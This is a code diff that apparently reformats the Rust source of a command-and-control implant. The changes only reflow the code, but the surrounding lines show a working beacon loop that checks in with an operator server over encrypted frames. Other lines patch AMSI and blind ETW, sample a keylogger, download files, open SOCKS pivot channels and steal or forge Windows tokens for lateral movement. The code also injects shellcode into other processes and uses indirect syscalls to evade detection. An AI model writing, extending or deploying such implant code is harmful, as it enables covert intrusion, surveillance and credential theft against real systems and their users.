@@ -92,7 +92,9 @@ pub unsafe fn beacon_loop() {
         // Once the host loads it, this lands the patch; subsequent cycles hit
         // the idempotency short-circuit. ETW is blinded once at entry (always
         // present).
-        unsafe { crate::blind::maybe_patch_amsi(); }
+        unsafe {
+            crate::blind::maybe_patch_amsi();
+        }
         let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
         sleep_jitter(secs, cfg.jitter_pct);
         // Sample the keyboard once per cycle while the keylogger is active.
@@ -105,7 +107,10 @@ pub unsafe fn beacon_loop() {
         // data on this POST. task_id 0 marks async channel data (correlated by
         // Response::Channel.chan on the operator side, not by task_id).
         for r in crate::pivot::pump_channels() {
-            pending.push(TaskResponse { task_id: 0, response: r });
+            pending.push(TaskResponse {
+                task_id: 0,
+                response: r,
+            });
         }
 
         let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
@@ -122,11 +127,17 @@ pub unsafe fn beacon_loop() {
             continue;
         };
 
-        let Ok(raw) = parse_frame(&body) else { continue };
+        let Ok(raw) = parse_frame(&body) else {
+            continue;
+        };
         // Server replies are sealed with Direction::ServerToClient; open with
         // the matching direction or the AEAD tag check fails.
-        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else { continue };
-        let Ok(tasks) = Task::decode_vec(&plaintext) else { continue };
+        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else {
+            continue;
+        };
+        let Ok(tasks) = Task::decode_vec(&plaintext) else {
+            continue;
+        };
 
         for t in tasks {
             if matches!(t.command, Command::Exit) {
@@ -140,12 +151,8 @@ pub unsafe fn beacon_loop() {
                 // If the accumulated batch would exceed the frame cap, flush it
                 // now (a streamed Download/Screenshot can produce a lot).
                 if pending_batch_size(&pending) > BATCH_FLUSH {
-                    let frame = encode_frame(
-                        &pubkey,
-                        counter,
-                        &key,
-                        &TaskResponse::encode_vec(&pending),
-                    );
+                    let frame =
+                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
                     let _ = crate::transport::post_frame(
                         cfg.server_host.as_bytes(),
                         cfg.server_port,
@@ -208,7 +215,8 @@ pub unsafe fn beacon_oneshot() -> u32 {
             cfg.beacon_uri.as_bytes(),
             &frame,
             cfg.use_tls,
-        ).is_some()
+        )
+        .is_some()
         {
             checked_in = true;
             break;
@@ -233,10 +241,18 @@ pub unsafe fn beacon_oneshot() -> u32 {
             cfg.beacon_uri.as_bytes(),
             &frame,
             cfg.use_tls,
-        ) else { continue };
-        let Ok(raw) = parse_frame(&body) else { continue };
-        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else { continue };
-        let Ok(tasks) = Task::decode_vec(&plaintext) else { continue };
+        ) else {
+            continue;
+        };
+        let Ok(raw) = parse_frame(&body) else {
+            continue;
+        };
+        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else {
+            continue;
+        };
+        let Ok(tasks) = Task::decode_vec(&plaintext) else {
+            continue;
+        };
 
         if tasks.is_empty() {
             continue; // no task queued yet, keep polling
@@ -249,7 +265,10 @@ pub unsafe fn beacon_oneshot() -> u32 {
                 break;
             }
             for response in execute(rt, t.command, &mut counter, &pubkey, &key, &cfg) {
-                pending.push(TaskResponse { task_id: t.task_id, response });
+                pending.push(TaskResponse {
+                    task_id: t.task_id,
+                    response,
+                });
             }
         }
         if !pending.is_empty() {
@@ -265,7 +284,11 @@ pub unsafe fn beacon_oneshot() -> u32 {
         }
         break;
     }
-    if got_task { 2 } else { 1 }
+    if got_task {
+        2
+    } else {
+        1
+    }
 }
 /// Only FileChunk/Output/BofOutput/Image carry significant volume; acks and
 /// errors are negligible. Mirrors agent-dev's heuristic.
@@ -295,7 +318,10 @@ fn execute(
 ) -> Vec<Response> {
     match cmd {
         Command::Ping => vec![Response::Ok],
-        Command::Sleep { seconds, jitter_pct: _ } => {
+        Command::Sleep {
+            seconds,
+            jitter_pct: _,
+        } => {
             // Re-task the beacon cadence: store the new interval for the loop
             // to read next cycle. (jitter_pct is config-wide; we honor the
             // configured jitter and only adjust the base interval live, like
@@ -313,7 +339,9 @@ fn execute(
         },
         Command::Download { path } => match rt {
             Some(rt) => crate::fs::do_download(rt, &path),
-            None => vec![Response::Err(String::from("download: syscall runtime down"))],
+            None => vec![Response::Err(String::from(
+                "download: syscall runtime down",
+            ))],
         },
         Command::FileOp { op, path, dest } => match rt {
             Some(rt) => vec![crate::fs::do_fileop(rt, op, &path, dest.as_deref())],
@@ -367,10 +395,20 @@ fn execute(
         // Connect/Socks: open + confirm reachability, report channel status.
         // Full relay is deferred (synchronous-poll loop can't host it) — see
         // pivot.rs for the honest limitation.
-        Command::Connect { proto, host, port, chan } => {
+        Command::Connect {
+            proto,
+            host,
+            port,
+            chan,
+        } => {
             vec![crate::pivot::do_connect(proto, &host, port, chan)]
         }
-        Command::Socks { chan, op, addr, port } => {
+        Command::Socks {
+            chan,
+            op,
+            addr,
+            port,
+        } => {
             vec![crate::pivot::do_socks(chan, op, &addr, port)]
         }
         // Relay data/close: forward to the channel table (pivot.rs).
@@ -379,12 +417,10 @@ fn execute(
         // ---- Post-exploitation token operations (lateral movement) ----
         // Steal/make a token, hold it process-wide; revert drops impersonation
         // but keeps the token; getuid reports the current thread identity.
-        Command::StealToken { pid } => {
-            match unsafe { crate::postex::steal_token(pid) } {
-                Ok(()) => vec![Response::Ok],
-                Err(m) => vec![Response::Err(m.into())],
-            }
-        }
+        Command::StealToken { pid } => match unsafe { crate::postex::steal_token(pid) } {
+            Ok(()) => vec![Response::Ok],
+            Err(m) => vec![Response::Err(m.into())],
+        },
         Command::MakeToken {
             domain,
             user,
@@ -399,8 +435,18 @@ fn execute(
             Err(m) => vec![Response::Err(m.into())],
         },
         Command::GetUid => vec![Response::Output(crate::postex::getuid().into_bytes())],
-        Command::Inject { method, pid, spawn_to, shellcode } => {
-            vec![crate::inject::do_inject(method, pid, spawn_to.as_str(), shellcode.as_slice())]
+        Command::Inject {
+            method,
+            pid,
+            spawn_to,
+            shellcode,
+        } => {
+            vec![crate::inject::do_inject(
+                method,
+                pid,
+                spawn_to.as_str(),
+                shellcode.as_slice(),
+            )]
         }
     }
 }
@@ -421,8 +467,8 @@ pub fn sleep_seconds(seconds: u32) {
         let called = unsafe {
             crate::syscalls::nt_wait_for_single_object(
                 rt,
-                INVALID_HANDLE,  // INVALID_HANDLE_VALUE → UserRequest wait-reason
-                0,                // not alertable (floor sleep)
+                INVALID_HANDLE, // INVALID_HANDLE_VALUE → UserRequest wait-reason
+                0,              // not alertable (floor sleep)
                 &delay_100ns as *const i64 as usize,
             )
         };
@@ -432,7 +478,9 @@ pub fn sleep_seconds(seconds: u32) {
     }
     // Fall back to the resolved NtWaitForSingleObject export (pre-runtime path,
     // or if indirect runtime init failed). Still gives UserRequest wait-reason.
-    if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject") } {
+    if let Some(addr) =
+        unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject") }
+    {
         let f: NtWaitForSingleObject = unsafe { core::mem::transmute(addr) };
         unsafe { f(INVALID_HANDLE, 0, &delay_100ns as *const i64) };
         return;
